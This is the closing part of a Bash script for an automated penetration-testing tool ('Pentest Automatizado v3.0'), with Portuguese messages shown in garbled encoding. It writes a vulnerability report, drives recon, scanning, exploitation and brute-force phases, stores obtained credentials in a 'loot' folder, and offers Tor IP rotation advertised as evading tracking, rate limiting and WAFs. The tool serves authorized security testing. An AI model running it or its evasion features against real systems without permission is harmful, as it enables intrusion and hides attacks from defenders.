        cat >> "$FINAL_REPORT" << EOF
ğŸ”´ CRÃTICO:
   - Foram encontradas ${VULN_CRITICAL} vulnerabilidades CRÃTICAS
   - AÃ§Ã£o imediata necessÃ¡ria!
   - Revisar: MS17-010, BlueKeep, SQL Injection, credenciais vazadas

EOF
    fi
    
    if [[ $VULN_HIGH -gt 0 ]]; then
        cat >> "$FINAL_REPORT" << EOF
ğŸŸ  ALTO:
   - ${VULN_HIGH} vulnerabilidades de severidade ALTA detectadas
   - Priorizar correÃ§Ã£o em atÃ© 7 dias
   - Revisar: FTP anonymous, SMTP open relay, null sessions

EOF
    fi
    
    cat >> "$FINAL_REPORT" << EOF

RECOMENDAÃ‡Ã•ES GERAIS:
  1. Desabilitar serviÃ§os nÃ£o utilizados
  2. Aplicar patches de seguranÃ§a mais recentes
  3. Implementar polÃ­ticas de senhas fortes
  4. Configurar firewall adequadamente
  5. Desabilitar protocolos inseguros (Telnet, FTP, HTTP bÃ¡sico)
  6. Implementar autenticaÃ§Ã£o multifator (MFA)
  7. Realizar auditorias de seguranÃ§a periÃ³dicas
  8. Configurar logs e monitoramento (SIEM)

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
7. ARQUIVOS GERADOS
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Todos os resultados detalhados estÃ£o em:
${OUTPUT_DIR}/

Estrutura:
  - recon/         : Reconhecimento (WHOIS, DNS, subdomÃ­nios)
  - scanning/      : Scans de portas e serviÃ§os
  - web/           : EnumeraÃ§Ã£o web (Nikto, Gobuster, WPScan)
  - exploitation/  : Tentativas de exploraÃ§Ã£o
  - passwords/     : Brute force attempts
  - loot/          : Credenciais e dados obtidos

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
8. DISCLAIMER
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Este Ã© um relatÃ³rio automatizado gerado por ferramentas de pentest.
Recomenda-se revisÃ£o manual detalhada por um profissional de seguranÃ§a.

Alguns resultados podem ser falsos positivos.
Algumas vulnerabilidades podem nÃ£o ter sido detectadas automaticamente.

âš ï¸  IMPORTANTE: Este teste foi realizado apenas com autorizaÃ§Ã£o formal.
                O uso nÃ£o autorizado Ã© ILEGAL.

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

RelatÃ³rio gerado em: $(date)
Pentest Automatizado v3.0 - Red Team Setup

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
EOF

    log "SUCCESS" "RelatÃ³rio salvo em: ${FINAL_REPORT}"
}

################################################################################
# MAIN
################################################################################

main() {
    # Banner
    print_banner
    
    # VerificaÃ§Ãµes iniciais
    check_root
    
    # Carregar biblioteca OPSEC
    load_opsec
    
    # Menu de entrada
    echo -e "${YELLOW}${BOLD}âš ï¸  AVISO LEGAL${NC}"
    echo -e "${YELLOW}Este script realiza testes de penetraÃ§Ã£o automatizados.${NC}"
    echo -e "${YELLOW}USE APENAS COM AUTORIZAÃ‡ÃƒO FORMAL POR ESCRITO!${NC}"
    echo -e "${YELLOW}O uso nÃ£o autorizado Ã© CRIME FEDERAL.${NC}"
    echo ""
    
    read -p "VocÃª possui autorizaÃ§Ã£o formal para testar o target? (s/N): " authorization
    if [[ ! "$authorization" =~ ^[Ss]$ ]]; then
        log "ERROR" "Teste cancelado. Obtenha autorizaÃ§Ã£o antes de continuar."
        exit 1
    fi
    
    # Input do target
    echo ""
    read -p "Digite o target (IP ou domÃ­nio): " TARGET
    
    if [[ -z "$TARGET" ]]; then
        log "ERROR" "Target nÃ£o pode ser vazio!"
        exit 1
    fi
    
    # Validar target
    validate_target
    
    # Modo OPSEC
    echo ""
    echo -e "${CYAN}${BOLD}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}${BOLD}               CONFIGURAÃ‡ÃƒO OPSEC                          ${NC}"
    echo -e "${CYAN}${BOLD}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    echo -e "${YELLOW}Deseja usar rotaÃ§Ã£o automÃ¡tica de IP via Tor?${NC}"
    echo -e "${BLUE}âœ… Vantagens:${NC}"
    echo -e "   - IP muda automaticamente a cada 3 segundos"
    echo -e "   - Dificulta rastreamento e bloqueio"
    echo -e "   - Bypassa rate limiting e WAF"
    echo -e "   - Maior anonimato"
    echo -e "${RED}âŒ Desvantagens:${NC}"
    echo -e "   - Scans mais lentos"
    echo -e "   - UDP scans nÃ£o funcionam"
    echo -e "   - Algumas ferramentas podem ter problemas"
    echo ""
    read -p "Usar rotaÃ§Ã£o Tor? (s/N): " use_tor
    
    if [[ "$use_tor" =~ ^[Ss]$ ]]; then
        USE_TOR_ROTATION=true
        log "SUCCESS" "Modo OPSEC: Tor com rotaÃ§Ã£o automÃ¡tica ATIVADO"
    else
        USE_TOR_ROTATION=false
        log "INFO" "Modo OPSEC: ConexÃ£o direta (sem Tor)"
    fi
    
    # Verificar dependÃªncias
    check_dependencies
    check_wordlists
    
    # Setup
    setup_environment
    
    # Setup Tor se necessÃ¡rio
    if [[ "$USE_TOR_ROTATION" == true ]]; then
        if ! setup_tor_rotation; then
            log "ERROR" "Falha ao configurar Tor! Abortando..."
            exit 1
        fi
    fi
    
    # OPSEC Pre-Check
    opsec_pre_check
    
    # Executar fases
    log "INFO" "Iniciando Penetration Test Automatizado..."
    echo ""
    
    phase_reconnaissance
    sleep 2
    
    phase_scanning
    sleep 2
    
    phase_service_enumeration
    sleep 2
    
    phase_exploitation
    sleep 2
    
    phase_reporting
    
    # Parar rotaÃ§Ã£o Tor
    if [[ "$USE_TOR_ROTATION" == true ]]; then
        stop_tor_rotation
    fi
    
    # FinalizaÃ§Ã£o
    echo ""
    log "SUCCESS" "${BOLD}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    log "SUCCESS" "PENTEST AUTOMATIZADO CONCLUÃDO!"
    log "SUCCESS" "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    log "INFO" "Resultados salvos em: ${OUTPUT_DIR}/"
    log "INFO" "RelatÃ³rio final: ${FINAL_REPORT}"
    echo ""
    log "INFO" "Resumo de Vulnerabilidades:"
    echo -e "  ${RED}CRÃTICAS:${NC} ${VULN_CRITICAL}"
    echo -e "  ${YELLOW}ALTAS:${NC}    ${VULN_HIGH}"
    echo -e "  ${BLUE}MÃ‰DIAS:${NC}   ${VULN_MEDIUM}"
    echo -e "  ${GREEN}BAIXAS:${NC}   ${VULN_LOW}"
    echo -e "  ${CYAN}INFO:${NC}     ${VULN_INFO}"
    echo ""
    
    # Abrir relatÃ³rio
    read -p "Deseja visualizar o relatÃ³rio agora? (s/N): " view_report
    if [[ "$view_report" =~ ^[Ss]$ ]]; then
        less "$FINAL_REPORT"
    fi
    
    log "INFO" "Obrigado por usar o Pentest Automatizado v3.0!"
}

# Trap para Ctrl+C
trap 'echo -e "\n${RED}[!] Pentest interrompido pelo usuÃ¡rio${NC}"; stop_tor_rotation 2>/dev/null; exit 130' INT
trap 'stop_tor_rotation 2>/dev/null' EXIT

# Executar
main "$@"
